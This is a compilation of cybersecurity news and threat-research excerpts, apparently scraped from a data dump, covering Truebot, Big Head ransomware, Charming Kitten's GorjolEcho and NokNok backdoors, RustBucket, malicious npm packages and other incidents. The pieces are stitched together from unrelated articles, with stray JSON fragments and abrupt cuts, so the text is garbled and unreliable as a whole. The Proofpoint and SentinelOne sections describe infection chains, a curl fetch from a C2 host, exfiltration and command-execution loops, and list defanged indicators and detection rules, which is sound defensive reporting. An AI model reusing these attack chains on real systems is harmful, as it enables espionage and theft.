It will now trial multiple scenarios on the network, including financial transactions, secure video communication and one-time-pad encryption.  This will connect two UK sites – its global HQ in Canary Wharf and a data center in Berkshire, 62km away.Additionally, it will test AWS edge computing capabilities using an AWS Snowball Edge device.Commenting on the new announcement, Colin Bell, CEO of HSBC Bank Plc and HSBC Europe, said: “Our customers, clients and employees expect us to have safe and secure operations and resilient cybersecurity, so we must stay ahead of the curve.”“That is why we are already preparing our global operations for a quantum future. We are spearheading industry-leading trials, recruiting highly trained experts and investing in strong, strategic partnerships to explore how we could deploy these technologies as they develop.“Today’s milestone proves the importance of collaboration and demonstrates the significant innovation and progress that can be achieved when industry leaders join forces.”It is hoped that HSBC’s trial of the QSMN will provide vital insights into the potential threat posed by quantum computers and how quantum technology can be used to enhance financial cybersecurity.The bank’s quantum strategy is also encompassing trials of Post Quantum Cryptography (PQC), and exploring applications in quantum computing across optimization, simulation and machine learning.Bill Vass, Vice President of Engineering at AWS, which is involved in the trial, said: \"Quantum Networking is a core pillar of AWS's quantum strategy to explore quantum technologies and bring new solutions to customers. This proof-of-concept is an exciting and important step toward understanding the commercial viability and scaling required to move quantum networking forward from the lab to the real world.” "

      "text": " Deputy Editor, Infosecurity MagazineA warning about increased Truebot malware activity involving new tactics, techniques and procedures (TTPs) has been issued by US and Canadian authorities on July 6 2023.The remote code execution vulnerability is present in Netwrix Auditor, software used for on-premises and cloud-based IT system auditing. Exploiting this CVE allows attackers to gain initial access and move laterally within the compromised network.The advisory went on to explain that once the malicious file is downloaded, Truebot renames itself and deploys FlawedGrace onto the host. This remote access tool (RAT) can then modify registry and print spooler programs, which allows it to escalate privilege and establish persistence.The agencies added that Truebot has been observed in association with a number of other delivery malware vectors and tools, including Raspberry Robin and Colbalt Strike.Organizations have been advised to take a number of steps to mitigate the increased threat from Truebot, including monitoring and controlling the execution of software and applying vendor patches to Netwrix Auditor.“Any organization identifying indicators of compromise (IOCs) within their environment should urgently apply the incident responses and mitigation measures detailed in this CSA and report the intrusion to CISA or the FBI,” the advisory read."

      "text": " Deputy Editor, Infosecurity MagazineThe EU agency’s first cyber-threat landscape for the health sector analysis revealed that patient data, such as electronic health records, were the most targeted assets (30%) by ransomware actors. Additionally, nearly half (46%) of all incidents aimed to steal or leak health organizations’ data.The reporting period, from January 2021 to March 2023, covered a large portion of the COVID-19 pandemic, in which the healthcare sector became a lucrative target for threat actors. On a number of occasions, patient data was leaked from government COVID-19 systems or laboratories. Insiders, both malicious and accidental, and poor security practices were identified as the primary causes of these leaks.ENISA’s analysis found that the vast majority of attacks (83%) were financially motivated, driven by the value of patient data.However, the authors noted that other groups, including state-sponsored actors and hacktivists were also active in this period. This led to an increase in DDoS attacks against health organizations, with a particular spike in 2023 when European hospitals and health authorities were targeted by pro-Russian groups.Overall, 10% of attacks were driven by “ideological motivation,” according to the report.Healthcare providers accounted for over half (53%) of the total incidents, with hospitals alone at 42%. Health authorities, bodies and agencies (14%) and the pharmaceutical industry (9%) were also major targets.Breach or data theft was the most common impact of cyber-incidents on the healthcare sector (43%), followed by disruption of non-healthcare services (25%) and disrupted healthcare services (22%).“Ransomware is such a catastrophic threat that it can inadvertently increase risk to loss of life if systems are down for a long period of time, which is why ransomware gangs target time sensitive systems that need a fast response to cyber-attacks.“Professionals must become ransomware resilient, using a strong cyber awareness strategy, a ransomware ready backup and recovery plan, strong access controls with multifactor authentication (MFA) and privileged access security.“As with one’s health – treating the symptom can be a greater cost than preventing the illness,” Carson explained. "

      "text": " Freelance JournalistSoftware threat researcher Lucija Valentić said the team discovered more than a dozen malicious npm packages posted between May 11 and June 13.These packages imitated legitimate modules, such as jquery, which has millions of weekly downloads. Although the malicious packages were downloaded roughly 1000 times, they were swiftly removed from npm after detection. ReversingLabs has named this campaign “Operation Brainleeches” due to the malicious infrastructure used to facilitate the theft of victim data.In the first part of the campaign, researchers identified six packages used exclusively in phishing attacks. These packages were linked to phishing campaigns that harvested user data through deceptive Microsoft.com login forms delivered via malicious email attachments.The second tranche comprised seven packages targeting email phishing campaigns and software supply chain attacks. These packages aimed to implant credential harvesting scripts into applications that unwittingly incorporated the malicious npm packages.ReversingLabs’ analysis revealed that the malicious npm packages played a role in active phishing attacks, likely conducted by low-skilled actors. While the full extent of the supply chain attack is unclear, using obfuscated code and invocating popular package names like jquery raise concerns about potential compromises.Valentić said the discovery emphasizes the importance of organizations remaining vigilant against malicious or compromised open-source packages. “This campaign further underscores the need for organizations to be on the lookout for signs that open-source packages could be malicious or compromised. Often, these attacks hinge on developer inattention to small details in naming, but that's not all,” she added.“The use of obfuscated code is a major warning sign. Other indicators include suspicious naming and package versioning, new packages with sketchy histories, smaller than expected downloads and dependencies, and more.”"

Still, a spokesperson for the network told The Register (Infosecurity has reached out to the network but has not received an answer at the time of writing) that the material in question appears to be related to production files and possibly dates back several decades. They further clarified that there is no indication of long-form content, employee data or user data involved in the leak.Allegedly, various Discord channels and private online communities have been sharing the stolen Nickelodeon files and videos, including content from the popular series SpongeBob SquarePants. Recent reports also suggest that the leaked Nickelodeon data also contains source code from the channel’s flash games.“Based on the information available, it appears that Nickelodeon is still trying to understand how this incident occurred, what the compromised data is, and how long ago the attack took place. This gives the impression that Nickelodeon has very little understanding of what has happened to its systems, which could raise alarm bells about the company’s security posture,” Wright explained.Wright emphasized the importance of proactive security measures for businesses, stating that preparation for cyber-attacks is essential. “This means running proactive security assessments to find and close exploitable bugs, training employees on attack techniques, and having the ability to map the network so, when breaches do occur, forensics can be run quickly, minimizing the time wasted trying to understand its impact,” he said.Wright also highlighted the risk of personal data being monetized by attackers while Nickelodeon investigates the incident.Editorial image credit: Phil Kolin / Shutterstock.com"

      "text": " Security researchers have dissected a recently emerged ransomware strain named ‘Big Head’ that may be spreading through malvertising that promotes fake Windows updates and Microsoft Word installers.‘Big Head’ ransomware is a .NET binary that installs three AES-encrypted files on the target system: one is used to propagate the malware, another is for Telegram bot communication, and the third encrypts files and can also show the user a fake Windows update.On execution, the ransomware also performs actions such as creating a registry autorun key, overwriting existing files if needed, setting system file attributes, and disabling the Task Manager.Each victim is assigned a unique ID that’s either retrieved from the %appdata%\\ID directory or it is generated using a random 40-character string.The ransomware deletes shadow copies to prevent easy system restoration before encrypting the targeted files and appending a “.poop” extension to their filenames.Also, Big Head will terminate the following processes to prevent tampering with the encryption process and to free up data that the malware should lock.The Windows, Recycle Bin, Program Files, Temp, Program Data, Microsoft, and App Data directories are skipped from encryption to avoid rendering the system unusable.Trend Micro has found that the ransomware checks if it runs on a virtual box, looks for the system language, and only proceeds to the encryption if it’s not set on that of a country member of the Commonwealth of Independent States (former Soviet states).During the encryption, the ransomware displays a screen that purports to be a legitimate Windows update.After the encryption process completes, the following ransom is dropped on multiple directories, and the victim’s wallpaper is also changed to alert of the infection.Trend Micro also analyzed two more Big Head variants, highlighting some key differences compared to the standard version of the ransomware.The second variant maintains ransomware capabilities but also incorporates stealer behavior with functions to collect and exfiltrate sensitive data from the victim system.The data that this version of Big Head can steal include browsing history, list of directories, installed drivers, running processes, product key, and active networks, and it can also capture screenshots.The third variant, discovered by Trend Micro, features a file infector identified as “Neshta,” which inserts malicious code into executables on the breached system.Although the exact purpose of this is unclear, Trend Micro’s analysts speculate that it could be to evade detection that relies on signature-based mechanisms.Notably, this variant uses a different ransom note and wallpaper from the other two, yet it is still tied to the same threat actor.Trend Micro comments that Big Head is not a sophisticated ransomware strain, its encryption methods are pretty standard, and its evasion techniques are easy to detect.Nevertheless, it appears to focus on consumers who can be fooled with easy tricks (e.g. fake Windows update) or they have difficulty understanding the safeguards necessary to steer away from cybersecurity risks.The multiple variants in circulation suggest that the creators of Big Head are continuously developing and refining the malware, experimenting with various approaches to see what works best.KELA's analysts have discovered a user on Telegram using the same names and avatars as those found in Big Head's ransom note, claiming to be a \"ransomware expert\" on posts published on \"IndoGhostsec.\"The user switched the group's name from 'BIG HEAD HACKER!' to 'BLACKHAT HACKER INDONESIA' in June 2022, while in March 2023, he started seeking the help of other members in his effort to create a ransomware builder and other relevant tools. "

      "text": " Security researchers observed a new campaign they attribute to the Charming Kitten APT group where hackers used new NokNok malware that targets macOS systems.The campaign started in May and relies on a different infection chain than previously observed, with LNK files deploying the payloads instead of the typical malicious Word documents seen in past attacks from the group.Regarding the phishing lures and social engineering methods seen in the campaign, the hackers posed as nuclear experts from the U.S. and approached targets with an offer to review drafts on foreign policy topics.In many cases, the attackers insert other personas in the conversation to add a sense of legitimacy and establish a rapport with the target.After gaining the target’s trust, Charming Kitten sends a malicious link that contains a Google Script macro, redirecting the victim to a Dropbox URL.This external source hosts a password-protected RAR archive with a malware dropper that leverages PowerShell code and an LNK file to stage the malware from a cloud hosting provider.The final payload is GorjolEcho, a simple backdoor that accepts and executes commands from its remote operators.To avoid raising suspicion, GorjolEcho will open a PDF with a topic relevant to the discussion the attackers had with the target previously.If the victim uses macOS, which the hackers typically realize after they fail to infect them with the Windows payload, they send a new link to “library-store[.]camdvr[.]org” that hosts a ZIP file masquerading as a RUSI (Royal United Services Institute) VPN app.When executing the Apple script file in the archive, a curl command fetches the NokNok payload and establishes a backdoor onto the victim’s system.NokNok generates a system identifier and then uses four bash script modules to set persistence, establish communication with the command and control (C2) server, and then starts exfiltrating data to it.The NokNok malware gathers system information that includes the version of  the OS, running processes, and installed applications.NokNok encrypts all collected data, encodes it in the base64 format, and exfiltrates it.Proofpoint also mentions that NokNok might feature more specific espionage-related functionality through other unseen modules.That backdoor featured modules that allowed taking screenshots, command execution, and cleaning the infection trail. It is likely that NokNok has these functions too.Overall, this campaign shows that Charming Kitten has a high degree of adaptability, is capable of targeting macOS systems when necessary, and highlights the growing threat of sophisticated malware campaigns to macOS users."

The messages demand feedback on a project called “Iran in the Global Security Context” and requested permission to send a draft for review. The researchers observed the TA453 using a variety of cloud hosting providers to deliver a new infection chain aimed at deploying a new PowerShell backdoor dubbed GorjolEcho.Following a benign email exchange with the the target recipient, the threat actors sent a malicious link that points to a Google Script macro. Once executed the macro, the recipient is directed to a Dropbox URL. At the provided URL, a password-encrypted .rar file named “Abraham Accords & MENA.rar” was hosted. The .rar archive contained a dropper named “Abraham Accords & MENA.pdf.lnk.” It is worth noting that the use of a .rar archive and an LNK file for malware distribution deviates from TA453’s typical infection chain involving VBA macros or remote template injection. Upon opening the enclosed LNK file the PowerShell downloads additional stages from a cloud hosting provider.The last-stage malware is the GorjolEcho backdoor, which displays a decoy PDF document, while awaiting next-stage payloads from the C2 server.GorjolEcho maintains persistence by copying the initial stages malware in a StartUp entry. If the target is a macOS system, TA453 sends a second email with a ZIP archive embedding a Mach-O binary that masquerades as a VPN application. The file is an AppleScript that connects to the C2 server and downloads a Bash script-based backdoor called NokNok.“This second stage is a bash script dubbed NokNok that establishes a backdoor on the system. It generates a system identifier by combining the operating system name, hostname, and a random number. That system identifier is then encrypted with the NokNok function and base64 encoded before being used as the payload of an HTTP POST to library-store.camdvr[.]org.” continues the analysis. “The script first establishes persistence by looping indefinitely and posts every two seconds. It expects responses containing either “KillKill” or “ModuleName.” If it receives the former, it terminates the script. If it receives the latter, it executes the content of the response as a command.”Proofpoint judges NokNok is almost certainly a port or evolution of the aforementioned GorjolEcho and is intended to serve as an initial foothold for TA453 intrusions.NokNok has a modular structure, the researchers identified four modules used to gather info such as running processes, installed applications, and system metadata. The backdoor maintains persistence by using LaunchAgents.NokNok is likely a port or evolution of the GorjolEcho backdoor and is used to establish an initial foothold for TA453 intrusions.\nCopyright@securityaffairs 2023 "

When given the opportunity, TA453 ported its malware and attempted to launch an Apple flavored infection chain dubbed NokNok by Proofpoint. TA453 also employed multi-persona impersonation in its unending espionage quest. Continuing With Benign Message ApproachTA453 continues to iterate and use benign messages to target experts in Middle Eastern affairs and nuclear security. As Joint Comprehensive Plan of Action (JCPOA) negotiations continue and Tehran finds itself increasingly isolated within its sphere of influence, TA453 is focusing a large majority of its targeting efforts against the experts likely informing these foreign policies.  As seen in one of TA453’s most recent campaigns (Figures 1 and 2), the threat actor initiated contact with its target using a benign email and later used multi-persona impersonation, listing additional experts to establish rapport with the target.    Figure 1. Initial TA453 approach using a benign email.Figure 2. TA453 multi-persona impersonation approach in a follow-on email.At this time, Proofpoint judges that all of these accounts are actor-created to spoof well-known experts and are not compromised accounts. After just one benign email interaction with the intended target, TA453 delivered a malicious link to a Google Script macro that would redirect the target to a Dropbox URL. The URL hosted a password encrypted .rar file, “Abraham Accords & MENA.rar” (SHA256: ddead6e794b72af26d23065c463838c385a8fdff9fb1b8940cd2c23c3569e43b), which contained a dropper titled “Abraham Accords & MENA.pdf.lnk” (SHA256:464c5cd7dd4f32a0893b9fff412b52165855a94d193c08b114858430c26a9f1d). Using a .rar and LNK file to deploy malware differs from TA453’s typical infection chain of using VBA macros or remote template injection. The LNK enclosed in the RAR used PowerShell to download additional stages from a cloud hosting provider. Figure 3. GorjolEcho full infection chain.When Dropbox was notified, they rapidly disrupted the accounts associated with this TA453 campaign. Following the dropper using obfuscated PowerShell to call out to the cloud hosting provider, the malware uses the Gorjol function to download base64 encoded content from a .txt file. The downloaded content is decoded and invoked, becoming the function Borjol (Figure 4).Figure 4. Borjol function.Borjol communicates over AES encrypted HTTPS with the attacker-registered subdomain fuschia-rhinestone.cleverapps[.]io via the legitimate Clever Cloud service, which allows users to host JavaScript applications in the cloud. The returned data decrypts into another Borjol function. This new function uses previous variables and results in decrypting the PowerShell backdoor, dubbed GorjolEcho by Proofpoint. GorjolEcho establishes persistence through putting a copy of the initial stages in a StartUp entry. The backdoor is now staged and ready to execute. GO, GO, GORJOL: GorjolEcho starts by displaying a decoy PDF that matches the content of the initial phishing approach before encoding, encrypting, and exfiltrating information to the C2. If the C2 responds with any HTTP response besides 400 or 200, an error message in Korean of “wau, ije ulineun mueos-eul halkkayo?\" is provided. The message roughly translates to “wow, now what are we doing?\".Figure 5. GorjolEcho.Following TA453’s attempted delivery of GorjolEcho, TA453 realized the delivered file would not run on the target’s Apple computer. About a week later, the TA453 persona reached out again via email with a new infection chain ported to work on Mac operating systems.  Figure 6. TA453 email with a Mac infection chain. The message contained a password-protected ZIP file containing the first stage Mac malware along with a series of instructions. Mach-O: Within the ZIP archive file was a bespoke Mac application masquerading as a RUSI VPN solution and share drive GUI. Upon initialization, it executes an Apple script file, which uses curl to download a file from library-store[.]camdvr[.]org/DMPR/[alphanumeric string]. At the time of analysis, library-store.camdvr[.]org was resolving to 144.217.129[.]176, an OVH IP. This second stage is a bash script dubbed NokNok that establishes a backdoor on the system. It generates a system identifier by combining the operating system name, hostname, and a random number. That system identifier is then encrypted with the NokNok function and base64 encoded before being used as the payload of an HTTP POST to library-store.camdvr[.]org. The script first establishes persistence by looping indefinitely and posts every two seconds. It expects responses containing either \"KillKill\" or \"ModuleName.\" If it receives the former, it terminates the script. If it receives the latter, it executes the content of the response as a command.  Proofpoint judges NokNok is almost certainly a port or evolution of the aforementioned GorjolEcho and is intended to serve as an initial foothold for TA453 intrusions.Figure 7. NokNok delivery.NokNok Modules: During our analysis, Proofpoint identified four very similar, but unique modules called the following by TA453: Figure 8. NokNok module analysis.These NokNok modules are bash scripts, all of which share an encryption and base64 chunking routine for exfiltration. The modules define SendDataByHttp function, which collects username and system name before encrypting the information with NokNok encryption, base64 encoding it, and chunking it for transportation. Logs are also sent to the TA453-controlled C2 server. Two of the modules (Processes and Persistence) were delivered twice during our analysis. The Processes module uses ps-aux to gather a list of all currently running processes. Figure 9. NokNok Processes module.The Informations module uses the system_profiler tool on macOS to retrieve information about the system's software, specifically the SPSoftwareDataType which includes details such as the operating system version, system uptime, and installed software. The module also uses ifconfig to gather network information. All of this information is encoded in base64 and then saved to result.txt for exfiltration. Figure 10. NokNok Informations module.The Applications module conducts similar reconnaissance, using echo to list installed Applications which are then base64 encoded for exfiltration. Finally, the Persistence module establishes persistence by first removing LaunchAgents, then recreating the same directory, writing a hardcoded key to Id.txt, and then using curl to download replacements to Finder and Finder's Property List. While the file was unavailable to Proofpoint at the time of our analysis, it is almost certain that the TA453-controlled server is either delivering another remote access trojan, or an additional stage for further operator exploitation. Figure 11. NokNok Persistence module.Fake File Sharing Website: The emailed instructions accompanying the malicious attachment included a link and credentials to a fake file sharing service spoofing a RUSI Wing FTP server, hosted on the dynamic DNS hostname filemanager.theworkpc[.]com.\n Figure 12. Lure website filemanager.theworkpc[.]com.The site appears to reject the provided username and password and is likely just there to establish legitimacy for the attached malware. There is the possibility that the website could be tracking and fingerprinting visitors, but no abnormal code was identified in Proofpoint’s review. When questioned by the target, TA453 claimed the provided password was correct and the target simply needed to run the application to appropriately access the files. Figure 13. Error message from TA453 lure website.Despite the identified infection chains differing from past TA453 intrusions where malware was deployed via VBA macro (GhostEcho, also known as CharmPower) or remote template injection (Korg), Proofpoint attributes this campaign and this malware to TA453 with high confidence. This assessment is based on both direct code similarities and similarities in overall campaign tactics, techniques, and procedures, Proofpoint assesses GorjolEcho and NokNok represent the latest iterations of TA453’s backdoor. This modular backdoor was first detected by Proofpoint in Fall 2021.Proofpoint currently views TA453 as overlapping with Microsoft’s Mint Sandstorm (formerly PHOSPHORUS) and roughly equivalent to Mandiant’s APT42 and PWC’s Yellow Garuda, all of which can generally be considered Charming Kitten. TA453 continues to significantly adapt its infection chains to complicate detection efforts and conduct cyber espionage operations against its targets of interest. The use of Google Scripts, Dropbox, and CleverApps demonstrate that TA453 continues to subscribe to a multi-cloud approach in its efforts to likely minimize disruptions from threat hunters. TA453’s willingness to port malware to Mach-O also demonstrates how much effort the threat actor is willing to put into pursuing its targets. Regardless of the infection method, TA453 continues to deploy modular backdoors in an effort to collect intelligence from highly targeted individuals. IndicatorTypeContext464c5cd7dd4f32a0893b9fff412b52165855a94d193c08b114858430c26a9f1dSHA256Dropper (Abraham Accords & MENA.pdf.lnk)ddead6e794b72af26d23065c463838c385a8fdff9fb1b8940cd2c23c3569e43bSHA256Archive (Abraham Accords & MENA.rar)1fb7f1bf97b72379494ea140c42d6ddd53f0a78ce22e9192cfba3bae58251da4SHA256NokNok Backdoore98afa8550f81196e456c0cd4397120469212e190027e33a1131f602892b5f79SHA256Applications NokNok Module5dc7e84813f0dae2e72508d178aed241f8508796e59e33da63bd6b481f507026SHA256Persistence NokNok Moduleb6916b5980e79a2d20b4c433ad8e5e34fe9683ee61a42b0730effc6f056191ebSHA256Processes NokNok Moduleacfa8a5306b702d610620a07040262538dd59820d5a42cf01fd9094ce5c3487cSHA256Informations NokNok Module[ADJ1] [CG2]library-store[.]camdvr[.]orgHostNokNok C2144.217.129[.]176IPNokNok C2filemanager.theworkpc[.]comHostSpoofed FTP Server websitefuschia-rhinestone.cleverapps[.]ioHostGorjolEcho C2 SIDRule Name2046007ET INFO DYNAMIC_DNS Query to a *.theworkpc .com Domain2046008ET INFO DYNAMIC_DNS HTTP Request to a *.theworkpc .com Domain2045981ET INFO DYNAMIC_DNS Query to a *.camdvr .org Domain2045982ET INFO DYNAMIC_DNS HTTP Request to a *.camdvr .org Domain2045737ET INFO Platform-As-A-Service Domain in DNS Lookup (cleverapps .io) Proofpoint appreciates the analytic assistance from Dropbox and HSBC Cyber Intelligence and Threat Analysis during this investigation.Subscribe to the Proofpoint Blog "

      "text": " UK / EMEA News Reporter, Infosecurity MagazineSecurity researchers have warned that the infamous TeamTNT group could be preparing a significant new campaign against cloud-native environments, after spotting a threat actor hunting for misconfigured servers.“This infrastructure is in early stages of testing and deployment, and is mainly consistent of an aggressive cloud worm, designed to deploy on exposed JupyterLab and Docker APIs in order to deploy Tsunami malware, cloud credentials hijack, resource hijack and further infestation of the worm,” it claimed.“We strongly believe that TeamTNT is behind this new campaign.”Although TeamTNT appeared to cease activities back in late 2021, Aqua Security linked the new campaign to the group via the Tsunami malware it commonly used, use of the dAPIpwn function and a C2 server that replies in German.The researchers haven’t ruled out an “advanced copycat” – although it would have to be a similarly sophisticated group capable of emulating TeamTNT code and which has a “distinct sense of humor” and “affinity for the Dutch language.”The new threat activity spotted by Aqua Security begins when the threat actor identifies a misconfigured Docker API or JupyterLab server and deploys a container or engages with the Command Line Interface (CLI) to scan for and identify additional victims.Aqua Security posted a list of recommendations to help organizations mitigate the threat."

      "text": " Deputy Editor, Infosecurity MagazineAround two in five (39%) businesses experienced a data breach in their cloud environment in 2022, a rise of 4% compared with 2021, a new report has found.The leading cause of cloud data breaches was human error, at 55%, according to the report. This was significantly above the next highest factor identified by respondents (21%), which was exploitation of vulnerabilities.The targeting of users to infiltrate cloud networks is also a trend being observed by cybersecurity company Proofpoint. Matt Cooke, Cybersecurity Strategist at Proofpoint told Infosecurity: “Attackers realize that people and their accounts are still the vulnerability. And it actually doesn’t matter now where that person is because everyone’s pretty much using the same tools. For example, everyone’s got a Microsoft 365 account.”“From an attacker’s perspective, if you’ve got a list of usernames and passwords and you think they might belong to a particular company, why would you not try them against those accounts? We see that going on quite significantly,” commented Cooke.The Thales report highlighted a 41% rise in SaaS usage from 2021 to 2023, with these applications increasingly replacing on-premises application functionality. Over half of cyber professionals (55%) said this expansion has made it more complex to secure data in the cloud.Additionally, the respondents ranked SaaS apps as the most targeted area for attacks (38%) in 2022, followed by cloud storage (36%).Proofpoint’s Cooke also highlighted apps as a key area in cloud security. He outlined a growing trend of malicious third-party applications being connected to organizations’ cloud accounts. Here, attackers trick users into granting permissions to malicious OAuth apps, giving them access to the user’s legitimate cloud services.“You get the pop-up from the app asking for permission to your account, which was probably verified when it was installed,” explained Cooke. “At some point it was turned into a malicious app and that malicious app then has full access to the account, from there leading to an account takeover.”Another trend identified in the Thales 2023 Global Cloud Security Study was the continuing surge of multicloud adoption, with 79% of organizations surveyed having more than one cloud provider in 2022.Chris Harris, EMEA Technical Associate Vice President, Data Security at Thales, told Infosecurity that multicloud environments have created more cybersecurity difficulties for organizations, as it means there are multiple security controls and data protection models to understand and implement.“Discrepancies in configuration and compatibility can mean gaps can emerge, increasing the risk of a breach or intrusion by a malicious actor,” he outlined. “It makes it all the more important to reconsider the cybersecurity measures that are in place as an organization moves critical data into multicloud environments, as those solutions that might have worked in a world where everything was kept in on-premises environments are likely no longer sufficient.”According to the research, just 22% of respondents in the study reported that 60% or more of their cloud data is encrypted. Additionally, on average, only 45% of sensitive data stored in the cloud is encrypted.Thales highlighted a number of factors that may explain the low levels of encryption, including a lack of understanding of specific cloud encryption operations and concerns about limiting developer productivity. Harris noted that organizations need to take new approaches to encryption due to the additional complexities caused by multi-cloud environments.“In a multi-cloud world, organizations need to find ways to centrally manage the encryption keys that are used to manage access across their infrastructure — whether that’s on-premises or in the cloud,” he explained.The report also emphasized the importance of increasing strong multifactor authentication (MFA) adoption to secure cloud data access, which was implemented by 65% of respondents.Another important security approach is continuous monitoring of attempts to target users, according to Cooke. “We recommend that organizations use tools that help them identify suspicious logins and behaviors within the cloud platforms,” he said. "

      "title": "BlueNoroff | How DPRK’s macOS RustBucket Seeks to Evade Analysis and Detection - SentinelOne",
      "text": " RustBucket is noteworthy for the range and type of anti-evasion and anti-analysis measures seen in various stages of the malware. In this post, we review the multiple malware payloads used in the campaign and highlight the novel techniques RustBucket deploys to evade analysis and detection.The Stage 1 is easily the least sophisticated and easily detected part of the attack chain. The arguments of the do shell script commands should appear in the Mac’s unified logs and as output from command line tools such as the ps utility.Success of the Stage 1 relies heavily on how well the threat actor employs social engineering tactics. In the case described by JAMF, the threat actors used an elaborate ruse of requiring an “internal” PDF reader to read a supposedly confidential or ‘protected’ document. Victims were required to execute the Stage 1 believing it to be capable of reading the PDF they had received. In fact, the Stage 1 was only a dropper, designed to protect the Stage 2 should anyone without the malicious PDF stumble on it.We have found a number of different Stage 2 payloads, some written in Swift, some in Objective-C, and both compiled for Intel and Apple silicon architectures (see IoCs at the end of the post). The sizes and code artifacts of the Stage 2 samples vary. The universal ‘fat’ binaries vary between 160Kb and 210Kb.Across the samples, various username strings can be found. Those we have observed in Stage 2 binaries so far include:Despite the differences in size and code artifacts, the Stage 2 payloads have in common the task of retrieving the Stage 3 from the command and control server. The Stage 2 payload requires a specially-crafted PDF to unlock the code which would lead to the downloading of the Stage 3 and provide an XOR’d key to decode the obfuscated C2 appended to the end of the PDF.In some variants, this data is executed in the downAndExecute function as described by previous researchers; in others, we note that download of the next stage is performed in the aptly-named down_update_run function. This function itself varies across samples. In b02922869e86ad06ff6380e8ec0be8db38f5002b, for example, it runs a hardcoded command via system().However, the same function in other samples, (e.g., d5971e8a3e8577dbb6f5a9aad248c842a33e7a26) use NSURL APIs and entirely different logic.Researchers at Elastic noted, further, that in one newer variant of Stage 2 written in Swift, the User-Agent string is all lowercase, whereas in the earlier Objective-C samples they are not.Although User-Agent strings are not inherently case sensitive, if this was a deliberate change it is possible the threat actors are parsing the User-Agent strings on the server side to weed out unwanted calls to the C2. That said, sloppiness around case-sensitivity is seen elsewhere in RustBucket samples (e.g., “/users/shared” in Stage 1), and the case variance may be no more than a product of different developers with different standards of rigor. In the most recent samples, the payload retrieved by Stage 2 is written to disk as“ErrorCheck.zip” in _CS_DARWIN_USER_TEMP (aka $TMPDIR typically at /var/folders/…/../T/) before being executed on the victim’s device.The Stage 3 payload has so far been seen in two distinct variants:However, variant B has not scrubbed all webT artifacts from the code and reference to the missing module can still be found in the strings.The substring “Trojan”, which does not appear in earlier variants, is also found in the file path referenced by the same string.Importantly, variant B contains a persistence mechanism that was not present in the earlier versions of RustBucket. This takes the form of a hardcoded LaunchAgent, which is written to disk at ~/Library/LaunchAgents/com.apple.systemupdate.plist. The ErrorCheck file also writes a copy of itself to ~/Library/Metadata/System Update and serves as the target executable of the LaunchAgent.Since the Stage 3 requires a URL as a launch parameter this is provided in the property list as a Program Argument. Curiously, the URL passed to ErrorCheck on launch is appended to this hardcoded URL in the LaunchAgent plist.Appending the supplied <url> value to the hardcoded URL can be clearly seen in the code, though whether this is an error or accounted for in the way the string is parsed by the binary we have yet to determine.After gathering environmental information, the malware calls sym.updator::send_request to post the data to the C2 using the following User-Agent string (this time not in lowercase):The malware compares the response against two hardcoded values, 0x31 and 0x30.In the sample analyzed by Elastic, the researchers reported that 0x31 causes the malware to self-terminate while 0x30 allows the operator to drop a further payload in the _CS_DARWIN_USER_TEMP directory.The choice of Rust and the complexity of the Stage 3 binaries suggest the threat actor was willing to invest considerable effort to thwart analysis of the payload. As the known C2s were unresponsive by the time we conducted our analysis, we were unable to obtain a sample of the next stage of the malware, but already at this point in the operation the malware has gathered a great deal of host information, enabled persistence and opened up a backdoor for further malicious activity.SentinelOne Singularity protects customers from known components of the RustBucket malware. Attempts to install persistence mechanisms on macOS devices are also dynamically detected and blocked by the agent.The RustBucket campaign highlights that the threat actor, whom previous researchers have confidently attributed to DPRK’s BlueNoroff APT, has invested considerable resources in multi-stage malware aimed specifically at macOS users and is evolving its attempts to thwart analysis by security researchers.The extensive effort made to evade analysis and detection in itself shows the threat actor is aware of the growing adoption of security software by organizations with macOS devices in their fleets, as security teams have increasingly begun to see the need for better protection than provided out-of-the-box. SentinelOne continues to track the RustBucket campaign and our analysis of the known payloads is ongoing.Stage 2 Mach-OsStage 3 Version A Mach-OsStage 3 Version B Mach-OsMalicious PDFsStage 1 Applications (.zip)0738687206a88ecbee176e05e0518effa4ca4166\n0be69bb9836b2a266bfd9a8b93bb412b6e4ce1be\n5933f1a20117d48985b60b10b5e42416ac00e018\n7a5d57c7e2b0c8ab7d60f7a7c7f4649f33fea8aa\n7e1870a5b24c78a5e357568969aae3a5e7ab857d\n89301dfdc5361f1650796fecdac30b7d86c65122\n9121509d674091ce1f5f30e9a372b5dcf9bcd257\n9a5f6a641cc170435f52c6a759709a62ad5757c7\na1a85cba1bc4ac9f6eafc548b1454f57b4dff7e0\nca59874172660e6180af2815c3a42c85169aa0b2\nd9f1392fb7ed010a0ecc4f819782c179efde9687\ne2bcdfbda85c55a4d6070c18723ba4adb7631807AppleScript main.scpt\ndabb4372050264f389b8adcf239366860662ac52Communications\ncloud[.]dnx.capital\ncrypto.hondchain[.]com.File Paths\nGet a demo \nDefeat every attack, at every stage of the threat lifecycle with SentinelOne Book a demo and see the world’s most advanced cybersecurity platform in action. \nSentinelLabs \nSentinelLabs: Threat Intel & Malware Analysis We are hunters, reversers, exploit developers, & tinkerers shedding light on the vast world of malware, exploits, APTs, & cybercrime across all platforms.\nWizard Spider and Sandworm \nMITRE Engenuity ATT&CK Evaluation Results SentinelOne leads in the latest Evaluation with 100% prevention.

      "text": " Law enforcement has detained a suspect believed to be a key member of the OPERA1ER cybercrime group, which has targeted mobile banking services and financial institutions in malware, phishing, and Business Email Compromise (BEC) campaigns.The gang, also known as NX$M$, DESKTOP Group, and Common Raven, is suspected of having stolen between $11 million and $30 million over the last four years in more than 30 attacks spanning 15 countries across Africa, Asia, and Latin America.The suspect was arrested by authorities in Côte d'Ivoire in early June following a joint law enforcement action dubbed Operation Nervone with the help of AFRIPOL, Interpol's Cybercrime Directorate, cybersecurity company Group-IB, and telecom carrier Orange.Further information that helped with the investigation was shared by the Criminal Investigative Division of the United States Secret Service and cybersecurity researchers from Booz Allen Hamilton DarkLabs.\"Operation Nervone was backed by two key INTERPOL initiatives: the African Joint Operation against Cybercrime and the INTERPOL Support Programme for the African Union in relation to AFRIPOL, funded by the United Kingdom's Foreign, Commonwealth & Development Office and Germany's Federal Foreign Office, respectively.\"​OPERA1ER members predominantly speak French and are believed to operate from Africa, and they rely on various tools in their attacks, including open-source solutions, common malware, and frameworks like Metasploit and Cobalt Strike.However, initial access to targets' networks is gained through spear-phishing emails that exploit popular subjects such as invoices or postal delivery notifications and push a wide range of first-stage malware, including Netwire, BitRAT, venomRAT, AgentTesla, Remcos, Neutrino, BlackNET, and Venom RAT, as well as password sniffers and dumpers.OPERA1ER has been observed maintaining access to compromised networks for a period ranging from three to twelve months, occasionally targeting the same company multiple times.They also 